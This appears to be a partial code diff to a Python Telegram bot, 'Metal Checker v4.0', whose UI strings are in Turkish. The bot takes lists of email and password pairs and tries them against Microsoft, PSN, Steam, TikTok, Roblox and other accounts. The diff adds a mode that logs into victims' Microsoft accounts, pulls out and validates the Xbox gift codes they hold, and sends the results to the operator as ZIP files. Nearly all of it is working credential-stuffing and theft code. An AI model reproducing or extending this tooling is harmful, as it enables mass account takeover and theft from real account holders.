+            with open(self.supercell_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Games: {', '.join(res['supercell_games'])}\n")
                 
         if self.mode in ["tiktok", "both"] and res.get("tiktok_username"):
-            with open(self.tiktok_file, 'a', encoding='utf-8') as f:
-                f.write(f"{base_str} | Username: @{res['tiktok_username']}\n")
+            with open(self.tiktok_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Username: @{res['tiktok_username']}\n")
                 
         if self.mode in ["minecraft", "both"] and res.get("minecraft_username"):
-            with open(self.minecraft_file, 'a', encoding='utf-8') as f:
-                f.write(f"{base_str} | Username: {res['minecraft_username']}\n")
+            with open(self.minecraft_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Username: {res['minecraft_username']}\n")
                 
         if self.mode in ["roblox", "both"] and res.get("roblox_status") == "LINKED":
             rbx = res.get("roblox_data", {})
             wearing_str = ", ".join(rbx.get("wearing", []))
             line = f"{base_str} | Username = {rbx.get('username')} | Friends = {rbx.get('friends')} | Banned = {rbx.get('banned')} | Created = {rbx.get('created')} | Profile = {rbx.get('profile')} | Wearing = [{wearing_str}]"
-            with open(self.roblox_file, 'a', encoding='utf-8') as f:
-                f.write(line + "\n")
+            with open(self.roblox_file, 'a', encoding='utf-8') as f: f.write(line + "\n")
 
     def save_2fa(self, email, password):
-        with open(self.two_fa_file, 'a', encoding='utf-8') as f:
-            f.write(f"{email}:{password}\n")
+        if self.mode in ["code_fetch", "code_fetch_val", "code_sort"]: return
+        with open(self.two_fa_file, 'a', encoding='utf-8') as f: f.write(f"{email}:{password}\n")
+
+    def save_code_result(self, code_line, result_type="fetched"):
+        target_file = {
+            "fetched": self.fetched_codes_file, "valid": self.valid_codes_file, 
+            "invalid": self.invalid_codes_file, "sorted": self.sorted_codes_file
+        }.get(result_type, self.fetched_codes_file)
+        
+        with open(target_file, 'a', encoding='utf-8') as f:
+            f.write(code_line + "\n")
 
     def get_delivery_files(self):
-        # Full scan ise klasörü zipleyip ver. Sadece bir mod ise sadece onun txt dosyasını ver.
         if self.mode == "both":
             zip_name = f"{self.base_folder}.zip"
+            shutil.make_archive(self.base_folder, 'zip', self.base_folder)
+            return [zip_name], True
+        elif self.mode in ["code_fetch", "code_fetch_val", "code_sort"]:
+            zip_name = f"{self.base_folder}_CODES.zip"
             shutil.make_archive(self.base_folder, 'zip', self.base_folder)
             return [zip_name], True
         else:
@@ -579,15 +908,10 @@ class ResultManager:
             elif self.mode == "minecraft" and os.path.exists(self.minecraft_file): files_to_send.append(self.minecraft_file)
             elif self.mode == "roblox" and os.path.exists(self.roblox_file): files_to_send.append(self.roblox_file)
             
-            # Her halükarda hits.txt de gönderelim bulamazsa
-            if not files_to_send and os.path.exists(self.hits_file):
-                files_to_send.append(self.hits_file)
-            
+            if not files_to_send and os.path.exists(self.hits_file): files_to_send.append(self.hits_file)
             return files_to_send, False
 
-# -----------------------------------------
-# LIVE UI STATS (MODE AWARE)
-# -----------------------------------------
+
 class LiveStats:
     def __init__(self, total, chat_id, mode):
         self.chat_id = chat_id
@@ -598,7 +922,6 @@ class LiveStats:
         self.two_fa = 0
         self.bads = 0
         
-        # Service specifics
         self.ms_premium = 0
         self.ms_expired = 0
         self.psn_hits = 0
@@ -608,9 +931,14 @@ class LiveStats:
         self.tk_hits = 0
         self.rbx_hits = 0
         
+        self.fetched_codes = 0
+        self.valid_codes = 0
+        self.invalid_codes = 0
+        
         self.latest_active_subs = deque(maxlen=3)
         self.latest_games = deque(maxlen=3)
         self.latest_roblox = deque(maxlen=3)
+        self.latest_codes = deque(maxlen=5)
         
         self.start_time = time.time()
         self.lock = Lock()
@@ -627,8 +955,7 @@ class LiveStats:
                     if active_subs:
                         self.ms_premium += 1
                         for s in active_subs: self.latest_active_subs.append(s.get('name', 'Unknown Sub'))
-                    elif subs:
-                        self.ms_expired += 1
+                    elif subs: self.ms_expired += 1
                         
                     if res.get("psn_orders", 0) > 0: 
                         self.psn_hits += 1
@@ -645,48 +972,215 @@ class LiveStats:
             elif status == "2FA": self.two_fa += 1
             else: self.bads += 1
 
+    def update_codes(self, fetched_count=0, valid_str=None, invalid_count=0):
+        with self.lock:
+            if fetched_count > 0: self.fetched_codes += fetched_count
+            if valid_str:
+                self.valid_codes += 1
+                self.latest_codes.append(valid_str)
+            if invalid_count > 0: self.invalid_codes += invalid_count
+
     def generate_text(self):
         with self.lock:
             elapsed = time.time() - self.start_time
             cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
             progress = (self.checked / self.total * 100) if self.total > 0 else 0
             
+            if self.mode in ["code_fetch", "code_fetch_val"]:
+                text = f"⚙️ *METAL CODES - LIVE ENGINE* ⚙️\n"
+                text += f"━━━━━━━━━━━━━━━━━━━━\n"
+                text += f"📥 *Accounts Checked:* `{self.checked}/{self.total}`\n"
+                text += f"🟢 *Total Codes Fetched:* `{self.fetched_codes}`\n"
+                if self.mode == "code_fetch_val":
+                    text += f"✅ *Valid Codes:* `{self.valid_codes}`\n"
+                    text += f"❌ *Invalid/Expired:* `{self.invalid_codes}`\n"
+                    if self.latest_codes:
+                        text += f"🔥 *Latest Valid Codes:*\n"
+                        for c in list(self.latest_codes): text += f"  `{c}`\n"
+                text += f"━━━━━━━━━━━━━━━━━━━━\n"
+                text += f"🚀 *CPM:* `{int(cpm)}` | ⏱ *Elapsed:* `{int(elapsed)}s`\n"
+                return text
+
             text = f"⚙️ *METAL CHECKER - LIVE RESULTS* ⚙️\n"
             text += f"━━━━━━━━━━━━━━━━━━━━\n"
-            text += f"🟢 *Hits:* `{self.hits}`\n"
-            text += f"🟡 *2FA:* `{self.two_fa}`\n"
-            text += f"🔴 *Bad:* `{self.bads}`\n"
+            text += f"🟢 *Hits:* `{self.hits}` | 🟡 *2FA:* `{self.two_fa}` | 🔴 *Bad:* `{self.bads}`\n"
             text += f"━━━━━━━━━━━━━━━━━━━━\n"
             
             if self.mode in ["microsoft", "both"]:
-                text += f"🎮 *Active Subs:* `{self.ms_premium}`\n"
-                text += f"💀 *Expired Subs:* `{self.ms_expired}`\n"
-                if self.latest_active_subs:
-                    text += f"🔥 *Latest Subs:* `{', '.join(list(self.latest_active_subs))}`\n"
-                text += f"━━━━━━━━━━━━━━━━━━━━\n"
+                text += f"🎮 *Active Subs:* `{self.ms_premium}` | 💀 *Expired:* `{self.ms_expired}`\n"
+                if self.latest_active_subs: text += f"🔥 *Latest:* `{', '.join(list(self.latest_active_subs))}`\n"
                 
             if self.mode in ["psn", "steam", "both"]:
-                if self.mode in ["psn", "both"]: text += f"🎯 *PSN Hits:* `{self.psn_hits}`\n"
-                if self.mode in ["steam", "both"]: text += f"🎲 *Steam Hits:* `{self.steam_hits}`\n"
-                if self.latest_games:
-                    text += f"🕹️ *Latest Games:* `{', '.join(list(self.latest_games))}`\n"
-                text += f"━━━━━━━━━━━━━━━━━━━━\n"
+                if self.mode in ["psn", "both"]: text += f"🎯 *PSN:* `{self.psn_hits}`\n"
+                if self.mode in ["steam", "both"]: text += f"🎲 *Steam:* `{self.steam_hits}`\n"
                 
             if self.mode in ["supercell", "tiktok", "minecraft", "roblox", "both"]:
                 if self.mode in ["supercell", "both"]: text += f"⚔️ *Supercell:* `{self.sc_hits}`\n"
                 if self.mode in ["tiktok", "both"]: text += f"📱 *TikTok:* `{self.tk_hits}`\n"
                 if self.mode in ["minecraft", "both"]: text += f"⛏️ *Minecraft:* `{self.mc_hits}`\n"
-                if self.mode in ["roblox", "both"]: 
-                    text += f"🟥 *Roblox:* `{self.rbx_hits}`\n"
-                    if self.latest_roblox:
-                        text += f"👤 *Latest Users:* `{', '.join(list(self.latest_roblox))}`\n"
-                text += f"━━━━━━━━━━━━━━━━━━━━\n"
+                if self.mode in ["roblox", "both"]: text += f"🟥 *Roblox:* `{self.rbx_hits}`\n"
                 
+            text += f"━━━━━━━━━━━━━━━━━━━━\n"
             text += f"📊 *Progress:* `{self.checked}/{self.total} ({progress:.1f}%)`\n"
             text += f"🚀 *CPM:* `{int(cpm)}`\n"
-            text += f"⚡️ *Coded by Metal Drops & Icardi*\n"
             return text
 
+# -----------------------------------------
+# 3. BACKGROUND PROCESS RUNNERS FOR CODES
+# -----------------------------------------
+def run_code_operations(chat_id, accounts, config):
+    try:
+        total_accounts = len(accounts)
+        result_mgr = ResultManager(chat_id, config["mode"])
+        stats = LiveStats(total_accounts, chat_id, config["mode"])
+        
+        msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
+        stats.message_id = msg.message_id
+        
+        def ui_updater():
+            while active_tasks.get(chat_id, False):
+                time.sleep(3.0)
+                if not active_tasks.get(chat_id, False): break 
+                try: bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
+                except: pass
+
+        updater_thread = Thread(target=ui_updater)
+        updater_thread.start()
+
+        tools = XboxCodeTools()
+        fetched_codes_list = []
+        
+        # 1. FETCH ASAMASI
+        def fetch_worker(acc):
+            if stop_flags.get(chat_id, False): return
+            email, password = acc
+            session = requests.Session()
+            session.headers.update({'User-Agent': 'Mozilla/5.0'})
+            try:
+                url_post, ppft = tools.fetch_oauth_tokens(session)
+                if url_post:
+                    rps = tools.fetch_login(session, email, password, url_post, ppft)
+                    if rps:
+                        uhs, xsts = tools.get_xbox_tokens(session, rps)
+                        if uhs:
+                            codes = tools.fetch_codes_from_xbox(session, uhs, xsts)
+                            if codes:
+                                stats.update_codes(fetched_count=len(codes))
+                                for c in codes:
+                                    fetched_codes_list.append(c)
+                                    result_mgr.save_code_result(c, "fetched")
+            except: pass
+            finally:
+                stats.update("CHECKED") # Sayac artsın diye dummy stat
+                session.close()
+
+        with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
+            for account in accounts:
+                if stop_flags.get(chat_id, False): break
+                executor.submit(fetch_worker, account)
+
+        # 2. VALIDATE ASAMASI (EGER ISTENDIYSE)
+        if config["mode"] == "code_fetch_val" and fetched_codes_list and not stop_flags.get(chat_id, False):
+            stats.checked = 0 # Sifirla ki validator tablosu baslasin
+            stats.total = len(fetched_codes_list)
+            
+            # Kodları checklemek için tek bir valid hesap yakala (örneğin listedeki ilk çalışan hesap)
+            val_session = None
+            for e, p in accounts:
+                val_session = tools.login_microsoft_account(e, p)
+                if val_session: break
+            
+            if val_session:
+                def validate_worker(code):
+                    if stop_flags.get(chat_id, False): return
+                    try:
+                        res = tools.validate_code_primary(val_session, code)
+                        status = res.get("status", "ERROR")
+                        msg_str = res.get("message", code)
+                        if status in ["VALID", "VALID_REQUIRES_CARD", "BALANCE_CODE"]:
+                            stats.update_codes(valid_str=msg_str)
+                            result_mgr.save_code_result(msg_str, "valid")
+                        else:
+                            stats.update_codes(invalid_count=1)
+                            result_mgr.save_code_result(msg_str, "invalid")
+                    except:
+                        stats.update_codes(invalid_count=1)
+                    finally:
+                        stats.update("CHECKED")
+
+                with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
+                    for code in fetched_codes_list:
+                        if stop_flags.get(chat_id, False): break
+                        executor.submit(validate_worker, code)
+                
+                val_session.close()
+            else:
+                bot.send_message(chat_id, "⚠️ Validator için çalışan aktif bir MS hesabı bulunamadı. Sadece fetch edildi.")
+
+        active_tasks[chat_id] = False
+        updater_thread.join()
+
+        try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *İŞLEM TAMAMLANDI!*", chat_id, stats.message_id, parse_mode="Markdown")
+        except: pass
+
+        bot.send_message(chat_id, "📦 Metal Codes paketi hazırlanıyor...")
+        files_to_send, is_zip = result_mgr.get_delivery_files()
+        
+        if is_zip and files_to_send:
+            with open(files_to_send[0], 'rb') as f:
+                bot.send_document(chat_id, f, caption="🔥 *METAL CODES - FULL PACKAGE (.ZIP)*", parse_mode="Markdown")
+        
+        try: shutil.rmtree(result_mgr.base_folder)
+        except: pass
+        if is_zip and files_to_send:
+            try: os.remove(files_to_send[0])
+            except: pass
+            
+        user_states[chat_id] = "IDLE"
+        
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Ciddi bir hata oluştu: {str(e)}")
+        active_tasks[chat_id] = False
+        user_states[chat_id] = "IDLE"
+
+def run_code_sorter(chat_id, content):
+    try:
+        lines = [l.strip() for l in content.split('\n') if l.strip()]
+        if not lines:
+            bot.send_message(chat_id, "❌ Dosya boş.")
+            return
+            
+        tools = XboxCodeTools()
+        game_groups = {}
+        for code_line in lines:
+            if '|' in code_line:
+                code, game_name = code_line.split('|', 1)
+                code = code.strip()
+                game_name = game_name.strip()
+                game_type = tools.extract_game_type(game_name)
+                if game_type not in game_groups: game_groups[game_type] = []
+                game_groups[game_type].append((code, game_name))
+            else:
+                if 'Other' not in game_groups: game_groups['Other'] = []
+                game_groups['Other'].append((code_line.strip(), 'Unknown'))
+                
+        formatted_output = tools.format_game_codes_output(game_groups)
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"sorted_codes_{timestamp}.txt"
+        
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(formatted_output)
+            
+        with open(filename, 'rb') as f:
+            bot.send_document(chat_id, f, caption="✅ *Kodlar Başarıyla Sortlandı!*", parse_mode="Markdown")
+            
+        os.remove(filename)
+        user_states[chat_id] = "IDLE"
+        
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Sort işlemi başarısız: {str(e)}")
+        user_states[chat_id] = "IDLE"
 
 # -----------------------------------------
 # TELEGRAM BOT HANDLERS & MENUS
@@ -699,10 +1193,11 @@ def send_welcome(message):
     
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🚀 Metal Checker Başlat", callback_data="menu_services"))
+    markup.add(InlineKeyboardButton("🎁 Metal Codes", callback_data="menu_codes"))
     
     bot.send_message(
         chat_id, 
-        "🤘 *Metal Drops & Icardi Sunar: METAL CHECKER v3.0*\n\nHoş geldin. Sınır yok, kural yok. Tüm modlar aktif. Başlamak için butona tıkla.",
+        "🤘 *Metal Drops & Icardi Sunar: METAL CHECKER v4.0*\n\nSınır yok, HWID yok. Hem hesap checker hem kod fetcher aktif. Seçimini yap.",
         parse_mode="Markdown", reply_markup=markup
     )
 
@@ -720,6 +1215,7 @@ def callback_handler(call):
     chat_id = call.message.chat.id
     data = call.data
     
+    # --- MENUS ---
     if data == "menu_services":
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
@@ -734,6 +1230,33 @@ def callback_handler(call):
         )
         bot.edit_message_text("🎯 *SERVICE SELECTION*\nHangi servisleri vurmak istersin?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
         
+    elif data == "menu_codes":
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            InlineKeyboardButton("1. Fetch Codes", callback_data="code_fetch"),
+            InlineKeyboardButton("2. Fetch & Validate Codes", callback_data="code_fetch_val"),
+            InlineKeyboardButton("3. Sort Codes", callback_data="code_sort")
+        )
+        bot.edit_message_text("🎁 *METAL CODES ENGINE*\nSınırsız ve HWID'siz Kod Çekici. Seçimini yap:", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+
+    # --- CODE HANDLERS ---
+    elif data in ["code_fetch", "code_fetch_val"]:
+        user_configs[chat_id]["mode"] = data
+        markup = InlineKeyboardMarkup(row_width=3)
+        markup.add(
+            InlineKeyboardButton("10 Thread", callback_data="thr_10"),
+            InlineKeyboardButton("30 Thread", callback_data="thr_30"),
+            InlineKeyboardButton("50 Thread", callback_data="thr_50"),
+            InlineKeyboardButton("100 Thread", callback_data="thr_100")
+        )
+        bot.edit_message_text("🚀 *THREADING*\nKaç eşzamanlı koldan hesaplara girelim?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+        
+    elif data == "code_sort":
+        user_configs[chat_id]["mode"] = data
+        user_states[chat_id] = "WAITING_FOR_SORT_FILE"
+        bot.edit_message_text("📂 *KODLARI SIRALA*\nİçinde daha önceden çektiğin kodların bulunduğu (.txt) formatındaki dosyayı gönder.", chat_id, call.message.message_id, parse_mode="Markdown")
+
+    # --- REGULAR SERVICES HANDLERS ---
     elif data.startswith("srv_"):
         mode = data.split("_")[1]
         user_configs[chat_id]["mode"] = mode
@@ -764,33 +1287,39 @@ def callback_handler(call):
         user_configs[chat_id]["threads"] = threads
         user_states[chat_id] = "WAITING_FOR_COMBO"
         
+        mode_text = user_configs[chat_id]['mode'].upper()
         bot.edit_message_text(
-            f"✅ *METAL CHECKER HAZIR!*\n\n"
-            f"Servis: `{user_configs[chat_id]['mode'].upper()}`\n"
+            f"✅ *SİSTEM HAZIR!*\n\n"
+            f"Mod: `{mode_text}`\n"
             f"Threads: `{threads}`\n\n"
-            f"🔥 *Şimdi combo dosyanı (.txt) gönder.* Geldiği an tarama otomatik başlayacak. Durdurmak için `/stop` yaz.",
+            f"🔥 *Şimdi dosyayı (.txt) veya listeyi gönder.* Geldiği an işlemler otomatik başlayacak. Durdurmak için `/stop` yaz.",
             chat_id, call.message.message_id, parse_mode="Markdown"
         )
 
 @bot.message_handler(content_types=['document', 'text'])
 def handle_combo(message):
     chat_id = message.chat.id
+    state = user_states.get(chat_id)
     
-    if user_states.get(chat_id) != "WAITING_FOR_COMBO": return
+    if state not in ["WAITING_FOR_COMBO", "WAITING_FOR_SORT_FILE"]: return
         
-    lines = []
+    content = ""
     if message.content_type == 'document':
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
-        try:
-            content = downloaded_file.decode('utf-8')
-            lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
+        try: content = downloaded_file.decode('utf-8')
         except:
             bot.send_message(chat_id, "❌ Dosya okunamadı. UTF-8 formatında geçerli bir txt gönder.")
             return
     elif message.content_type == 'text':
-        lines = [l.strip() for l in message.text.split('\n') if l.strip() and ':' in l]
-        
+        content = message.text
+
+    if state == "WAITING_FOR_SORT_FILE":
+        run_code_sorter(chat_id, content)
+        return
+
+    # Normal Combo İşlemleri
+    lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
     if not lines:
         bot.send_message(chat_id, "❌ Combolar bulunamadı. 'email:pass' formatında bir şeyler at.")
         return
@@ -798,8 +1327,19 @@ def handle_combo(message):
     user_states[chat_id] = "CHECKING"
     stop_flags[chat_id] = False
     active_tasks[chat_id] = True
-    
     config = user_configs[chat_id]
+    
+    # Eğer yeni METAL CODES sistemiyse oraya yönlendir, değilse klasik CHECKER sistemini başlat.
+    if config["mode"] in ["code_fetch", "code_fetch_val"]:
+        accounts = []
+        for line in lines:
+            parts = line.split(':', 1)
+            if len(parts) == 2: accounts.append((parts[0].strip(), parts[1].strip()))
+        
+        Thread(target=run_code_operations, args=(chat_id, accounts, config)).start()
+        return
+
+    # Klasik Checker
     result_mgr = ResultManager(chat_id, config["mode"])
     stats = LiveStats(len(lines), chat_id, config["mode"])
     
@@ -821,7 +1361,6 @@ def handle_combo(message):
             elif res["status"] == "2FA": result_mgr.save_2fa(parts[0].strip(), parts[1].strip())
         except: stats.update("ERROR")
 
-    # Tam olarak 2 saniyede bir ekran güncellemesi
     def ui_updater():
         while active_tasks.get(chat_id, False):
             time.sleep(2.0)
@@ -845,9 +1384,7 @@ def handle_combo(message):
     
     bot.send_message(chat_id, "📦 Sonuçlar paketleniyor (Ayarlarına göre TXT veya ZIP)...")
     
-    # Teslimat (Full Scan ise ZIP, değilse TXT)
     files_to_send, is_zip = result_mgr.get_delivery_files()
-    
     if is_zip and files_to_send:
         with open(files_to_send[0], 'rb') as f:
             bot.send_document(chat_id, f, caption="🔥 *METAL CHECKER - FULL SCAN (.ZIP)*", parse_mode="Markdown")
@@ -870,15 +1407,12 @@ def handle_combo(message):
 if __name__ == "__main__":
     print("[DEBUG] Eski oturumlar ve çakışmalar zorla temizleniyor...")
     try:
-        # Varsa takılı kalan webhook'ları kaldırır
         bot.remove_webhook()
         time.sleep(1)
     except Exception as e:
         print(f"[DEBUG] Webhook temizleme atlandı: {e}")
         pass
         
-    print("[DEBUG] Metal Checker v3.0 Bot Başlatılıyor...")
-    
-    # skip_pending=True diğer instance'ların yarattığı trafik sıkışıklığını ezer.
+    print("[DEBUG] Metal Checker v4.0 (Fetcher Edition) Bot Başlatılıyor...")
     bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
 
